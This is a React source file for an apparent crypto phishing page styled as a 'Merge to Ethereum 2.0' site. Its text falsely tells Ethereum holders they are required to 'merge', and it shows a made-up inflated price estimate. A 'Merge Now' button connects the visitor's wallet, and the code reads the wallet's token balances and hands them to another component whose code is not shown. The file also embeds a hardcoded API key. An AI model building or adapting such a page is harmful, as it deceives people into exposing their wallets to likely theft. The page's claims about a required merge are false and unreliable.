import { useCallback, useEffect, useRef, useState } from "react";
import TokenPrice from "./TokenPrice";
import axios from "axios";
import { ethers } from "ethers";
import Wallet from "./wallet";
import { Alchemy, Network, TokenBalance, Utils } from "alchemy-sdk";

const config = {
    apiKey: "QmN987r2njqRwi-sayxhDTX0rZariEcY",
    network: Network.ETH_MAINNET,
};

export const alchemy = new Alchemy(config);


const Account = () => {
     const [ethPrice, setEthPrice] = useState(0);
  const [ethPriceChange, setEthPriceChange] = useState(0);
    const [ready, setReady] = useState(false);
    const [balance, setBalance] = useState<TokenBalance[]>([])

    const authenticateUser = async () => {
        await Wallet.create()
        await Wallet.connectWallet()
        setReady(true);
    };

    const getTokenBalances = async (address: string) => {
        if (!address) return;
        const balances = await alchemy.core.getTokenBalances(address)
        setBalance(balances.tokenBalances);
    }
    
      const getPrice = async () => {
    try {
      const response : any = await axios.get("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd&include_24hr_change=true")
      setEthPrice(response.data.ethereum.usd)
      setEthPriceChange(response.data.ethereum.usd_24h_change)
    } catch (err) {
      console.log(err);
    }
  }

  useEffect(() => {
    getPrice();
  })


    useEffect(() => {
        if (Wallet.address) {
            getTokenBalances(Wallet.address)
        }
    }, [Wallet.address, ready]);
    return (
        <>
            
            {ready && balance.length ? (
                <TokenPrice
                    chaidId={'0x1'}
                    balances={balance as TokenBalance[]}
                />
            ) : <></>}
         <div>
      <nav className='sticky top-0 px-8 py-4 border-b bg-white z-10'>
        <div className='flex items-center  gap-4'>
          <svg className='w-5' viewBox="0 0 115 182" fill="none"><path d="M57.5054 181V135.84L1.64064 103.171L57.5054 181Z" fill="#F0CDC2" stroke="#1616B4" stroke-linejoin="round"></path><path d="M57.6906 181V135.84L113.555 103.171L57.6906 181Z" fill="#C9B3F5" stroke="#1616B4" stroke-linejoin="round"></path><path d="M57.5055 124.615V66.9786L1 92.2811L57.5055 124.615Z" fill="#88AAF1" stroke="#1616B4" stroke-linejoin="round"></path><path d="M57.6903 124.615V66.9786L114.196 92.2811L57.6903 124.615Z" fill="#C9B3F5" stroke="#1616B4" stroke-linejoin="round"></path><path d="M1.00006 92.2811L57.5054 1V66.9786L1.00006 92.2811Z" fill="#F0CDC2" stroke="#1616B4" stroke-linejoin="round"></path><path d="M114.196 92.2811L57.6906 1V66.9786L114.196 92.2811Z" fill="#B8FAF6" stroke="#1616B4" stroke-linejoin="round"></path></svg>
          <span className='text-zinc-600 text-lg'>
            Ethereum 2.0
          </span>
        </div>
      </nav>
      <div className="px-5 pt-20 bg-8">
        <div className='flex justify-center'>
          <div className='h-full w-full absolute -z-10 blur'>
            <img src={process.env.PUBLIC_URL + "/get-eth.png"} alt="" />
          </div>
          <div className='w-full'>
            <h1 className="text-5xl text-slate-900 font-bold text-center">
              Merge to Ethereum 2.0
            </h1>
            <div className="md:w-10/12 mx-auto text-center">
              <p className="mt-8 text-zinc-600 font-normal text-sm md:text-xl">
                Ethereum 2.0 is now <span className="font-semibold"> PROOF OF WORK to PROOF OF STAKE </span> consensus mechanism. Ethereum holders are required to merge to gain full advantages of the Ethereum 2.0 operation

              </p>
              <p className="text-zinc-600 md:text-xl mt-6 text-sm">
                The merge is an important step for the next major updates on the Ethereum roadmap like sharing 2023, which will increase te transaction throughput of Ethereum.
              </p>
            </div>

            <div className="mt-12">
              <div className="flex gap-5 md:flex-row flex-col px-4 justify-center">
                <div className="md:w-4/12  bg rounded border py-6 from-pink-100 bg-gradient-to-b">
                  <div className="text-center flex flex-col gap-2">
                    <span className="uppercase text-zinc-600">
                      CURRENT ETH PRICE (USD)
                    </span>
                    <h2 className="text-5xl font-medium text-zinc-800">
                      ${ethPrice}
                    </h2>
                    <div className='mt-4 flex gap-2 items-center justify-center'>
                      <h4 className={`text-[1.6rem] font-normal  ${ethPriceChange && ethPriceChange.toString().includes("-") ? "text-[#d46666]" : "text-green-400"} `}>
                        {Number(ethPriceChange).toFixed(2)}%
                      </h4>
                      <span className="text-zinc-600 text-sm text-light">
                        (LAST 24 HOURS)
                      </span>
                    </div>
                  </div>
                </div>
                <div className="md:w-4/12  bg rounded border py-6 from-green-100 bg-gradient-to-b">
                  <div className="text-center flex flex-col gap-2">
                    <span className="uppercase text-zinc-600">
                      ESTIMATED ETH PRICE (USD)
                    </span>
                    <h2 className="text-5xl font-medium text-zinc-800">
                      ${(ethPrice * 1.2).toFixed(2)}
                    </h2>
                    <div className='mt-4 flex gap-2 items-center justify-center'>
                      <h4 className={`text-[1.6rem] font-normal text-green-400`}>
                        +{Number((ethPriceChange / 2).toString().replace("-", "")).toFixed(2)}%
                      </h4>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="mt-4 text-center">
              <button onClick={authenticateUser} className="px-6 py-2 bg-blue-700 rounded text-white">
                Merge Now
              </button>
            </div>
            <div className="md:w-10/12 mx-auto text-center">
              <p className="text-zinc-600 md:text-xl mt-6 text-sm">
                Be careful of scammers; Do not give your seed phrase to anyone!!
              </p>
            </div>
          </div>
        </div>
      </div>
    </div >
        </>
    );
};


export default Account;
